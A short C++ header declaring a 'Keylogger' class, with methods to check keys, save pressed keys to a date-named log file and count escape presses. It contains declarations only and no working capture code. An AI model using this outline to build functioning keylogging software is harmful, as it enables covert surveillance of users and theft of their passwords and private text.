#pragma once
#include <string>
#include <cstdio>

class Keylogger
{
private:
	std::string fileName;
	short escapeCounter;
	FILE *file;

	void getNameOfFileFromLocalDate();
	bool isCreatedFile();
	void saveKeys();
	void checkKey();
	void saveKeyToFile(int pressedKey);
	void countIfEscape(int pressedKey);

public:
	Keylogger(const char * _fileName);
	Keylogger();
	~Keylogger();
};